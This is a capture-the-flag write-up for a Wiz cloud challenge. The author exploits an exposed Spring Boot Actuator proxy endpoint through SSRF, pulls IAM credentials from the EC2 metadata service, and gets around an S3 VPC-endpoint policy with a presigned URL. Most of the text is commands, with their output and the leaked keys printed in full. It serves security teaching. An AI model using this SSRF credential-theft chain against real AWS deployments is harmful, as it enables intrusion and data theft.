---
title: "Perimeter Leak"
date: 2025-07-30
draft: false
description: "Solutions for the first challenge from WIZ utltimate cloud champion"
tags: ["ctf", "cloud", "aws"]
aliases: ["/writeups/Wiz-Cloudsec/PerimeterLeak/"]
---

Our first challenge starts with a brief introduction..

```bash
You've discovered a Spring Boot Actuator application running on AWS: curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com
{"status":"UP"}
user@monthly-challenge:~$ 
```

Ok! so we are dealing with a Spring Boot Actuator application, but wait, what is even that? The official docs from baeldung states that Actuator brings production-ready features to our application. Monitoring apps, gathering metrics, etc...
It comes with Predefined Endpoints, you can find more inforamtion 👉 [here](https://www.baeldung.com/spring-boot-actuators).

The most interesting Endpoint is `/actuator/env`, CURLing it returnes some valuable data! such as the S3 bucket name! and some other info about the ec2 instance ;)

```bash
user@monthly-challenge:~$ curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/env | jq | grep -i bucket -A2 -B2
          "origin": "System Environment Property \"SHELL\""
        },
        "BUCKET": {
          "value": "challenge01-470XXXX",
          "origin": "System Environment Property \"BUCKET\""
        },
        "LOGNAME": {
```

Another interesting Endpoint is the `/actuator/mappings`, which provides information about the application's request mappings and lists all the Endpoints within the applicatiopn.

What attracts me the most is this endpoint, which is a proxy that takes `url` as param!

```json
{
              "predicate": "{ [/proxy], params [url]}",
              "handler": "challenge.Application#proxy(String)",
              "details": {
                "handlerMethod": {
                  "className": "challenge.Application",
                  "name": "proxy",
                  "descriptor": "(Ljava/lang/String;)Ljava/lang/String;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [],
                  "params": [
                    {
                      "name": "url",
                      "negated": false
                    }
                  ],
                  "patterns": [
                    "/proxy"
                  ],
                  "produces": []
                }
              }
            },
```

The first thing that came straight to my mind after knowing that the application is running in EC2 instance, is trying to send a GET request to the 169-254 metadata server! and yup, it did work! but we are unauthorized!

No problem, lets kindly request a temporary token from the metadata server!

```bash
TOKEN=$(curl -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -XPUT https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token)

user@monthly-challenge:~$ curl -H "X-aws-ec2-metadata-token: ${TOKEN}" https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/   
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hibernation/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
system
```

Okay, thass cool! lets go ahead and grab the iam security creds and see what we can do next!

```json
user@monthly-challenge:~$ curl -H "X-aws-ec2-metadata-token: $TOKEN" https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.meta-data/iam/security-credentials/challenge01-5592368

{
  "Code" : "Success",
  "LastUpdated" : "2025-09-06T12:38:55Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIARK7LBOHXNJ5AIPXX",
  "SecretAccessKey" : "EODTCiWkez2OTMwg3U0q+s1xc4HgB9YYpIS3XiqJ",
  "Token" : "IQ....",
  "Expiration" : "2025-09-06T18:59:09Z"
```

After configuring the aws creds, we can now see whats inside the bucket!

```bash
user@monthly-challenge:~$ aws s3 ls s3://challenge01-470fXXX --recursive
2025-06-18 17:15:24         29 hello.txt
2025-06-16 22:01:49         51 private/flag.txt
```

For a moment, I though I got the flag! but it didn't end here...
I tried to copy the content of flag.txt object locally but I got a frobbiden err msg!

```bash
user@monthly-challenge:~$ aws s3 cp s3://challenge01-XXX/private/flag.txt --profile p1 flag
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

Why? this is because of the S3 policy, which says that you cannot get any object under /private/* out of the S3 bucket, unless the request is coming from the vpc id `vpce-0dfd8b6aa1642a0570`!

```bash
user@monthly-challenge:~$ aws s3api get-bucket-policy --profile p1 --bucket challenge01-470fXXX | jq
{
  "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Deny\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::challenge01-470fXXX/private/*\",\"Condition\":{\"StringNotEquals\":{\"aws:SourceVpce\":\"vpce-0dfd8b6aa1642a057\"}}}]}"
}
```

Remember the `/proxy` endpoint we discovered a while ago under `/actuator/mappings`? This will allow us to send a request from the application which is running in the EC2 instance that is provisionned on the same VPC.

Its actually very simple, we just have to presign an url for the S3 bucket, and send the request from the application using the /proxy endpoint! and just like that we get the flag of the first challenge :D

```bash
user@monthly-challenge:~$ URL=$(aws s3 presign s3://challenge01-470fXXXX/private/flag.txt --profile p1 | jq -sRr @uri)
user@monthly-challenge:~$ echo $URL
https%3A%2F%2Fchallenge01-470XXX.s3.amazonaws.com%2Fprivate%2Fflag.txt%3FX-Amz-Algorithm%3DAWS4..
user@monthly-challenge:~$ curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=${URL} 
The flag is: WIZ_CTF_***********
```